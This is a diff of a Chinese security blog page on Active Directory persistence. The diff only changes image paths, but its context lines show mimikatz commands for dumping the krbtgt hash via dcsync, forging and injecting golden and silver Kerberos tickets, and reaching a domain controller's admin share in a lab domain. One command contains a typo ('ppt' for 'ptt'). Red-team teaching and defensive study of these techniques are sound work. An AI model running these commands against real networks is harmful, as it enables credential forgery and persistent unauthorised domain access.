@@ -23,18 +23,18 @@
 <meta property="og:site_name" content="Errorecho">
 <meta property="og:description" content="前言当我们拿到域控权限之后，需要持续稳定的控下域控，因此需要用到驻留技术，维持域控权限">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://www.errorecho.com/img/23.png">
-<meta property="og:image" content="http://www.errorecho.com/img/24.png">
-<meta property="og:image" content="http://www.errorecho.com/img/25.png">
-<meta property="og:image" content="http://www.errorecho.com/img/26.png">
-<meta property="og:image" content="http://www.errorecho.com/img/27.png">
-<meta property="og:image" content="http://www.errorecho.com/img/28.png">
+<meta property="og:image" content="http://www.errorecho.com/images/23.png">
+<meta property="og:image" content="http://www.errorecho.com/images/24.png">
+<meta property="og:image" content="http://www.errorecho.com/images/25.png">
+<meta property="og:image" content="http://www.errorecho.com/images/26.png">
+<meta property="og:image" content="http://www.errorecho.com/images/27.png">
+<meta property="og:image" content="http://www.errorecho.com/images/28.png">
 <meta property="article:published_time" content="2021-08-12T05:16:06.000Z">
-<meta property="article:modified_time" content="2021-12-02T07:04:01.334Z">
+<meta property="article:modified_time" content="2022-10-13T09:51:06.806Z">
 <meta property="article:author" content="Errorecho">
 <meta property="article:tag" content="驻留技术">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://www.errorecho.com/img/23.png">
+<meta name="twitter:image" content="http://www.errorecho.com/images/23.png">
   
   <title>域渗透之驻留技术 - Errorecho</title>
 
@@ -263,7 +263,7 @@
 </ul>
 <p>1、获取krbtgt的hash值和域sid</p>
 <figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">lsadump:</span>:dcsync /domain:god<span class="hljs-meta">.org</span> /user:krbtgt<br></code></pre></td></tr></table></figure>
-<p><img src="/img/23.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/images/23.png" srcset="/img/loading.gif" lazyload></p>
 <p>2、生成Golden Ticket<br>​ 得到KRBTGT HASH之后使用mimikatz中的kerberos::golden功能生成金票golden.kiribi，即为伪造成功的TGT。</p>
 <ul>
 <li>/admin：伪造的用户名</li>
@@ -273,13 +273,13 @@
 <li>/ticket：生成的票据名称</li>
 </ul>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">kerberos</span>::golden /admin:administrator /domain:<span class="hljs-number">0</span>day.org /sid:S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">1812960810</span>-<span class="hljs-number">2335050734</span>-<span class="hljs-number">3517558805</span> /krbtgt:<span class="hljs-number">36</span>f<span class="hljs-number">9</span>d<span class="hljs-number">9</span>e<span class="hljs-number">6</span>d<span class="hljs-number">98</span>ecf<span class="hljs-number">8307</span>baf<span class="hljs-number">4</span>f<span class="hljs-number">46</span>ef<span class="hljs-number">842</span>a<span class="hljs-number">2</span> /ticket:golden.kiribi<br></code></pre></td></tr></table></figure>
-<p><img src="/img/24.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/images/24.png" srcset="/img/loading.gif" lazyload></p>
 <p>3、导入票据<br>通过mimikatz中的kerberos::ptt功能（Pass The Ticket）将golden.kiribi导入内存中。</p>
 <figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino">kerberos::purge<br>kerberos::ppt golden.kiribi<br>kerberos::list<br></code></pre></td></tr></table></figure>
-<p><img src="/img/25.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/images/25.png" srcset="/img/loading.gif" lazyload></p>
 <p>4、此时就可以通过dir成功访问域控的共享文件夹。</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">dir</span> \\owa.god.org\c<span class="hljs-variable">$</span><br></code></pre></td></tr></table></figure>
-<p><img src="/img/26.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/images/26.png" srcset="/img/loading.gif" lazyload></p>
 <h1 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h1><p>当拥有Server(Service) Hash时，我们就可以伪造一个不经过KDC认证的一个Ticket。<br>Server Session Key在未发送Ticket之前，服务器是不知道Server Session Key是什么的。 所以，一切凭据都来源于Server Hash。</p>
 <p>参数说明</p>
 <ul>
@@ -293,9 +293,9 @@
 </ul>
 <p>伪造票据</p>
 <figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts">mimikatz “kerberos::golden /domain:<span class="hljs-params">&lt;域名&gt;</span> /sid:<span class="hljs-params">&lt;域 SID&gt;</span> /target:<span class="hljs-params">&lt;目标服务器主机名&gt;</span> /service:<span class="hljs-params">&lt;服务类型&gt;</span> /rc4:<span class="hljs-params">&lt;NTLM Hash&gt;</span> /user:<span class="hljs-params">&lt;用户名&gt;</span> /ptt<span class="hljs-string">&quot; exit</span><br></code></pre></td></tr></table></figure>
-<p><img src="/img/27.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/images/27.png" srcset="/img/loading.gif" lazyload></p>
 <p>查看文件夹</p>
-<p><img src="/img/28.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/images/28.png" srcset="/img/loading.gif" lazyload></p>
 <p>各种服务中的示例</p>
 <ul>
 <li>Service Type    Service Silver Tickets  </li>
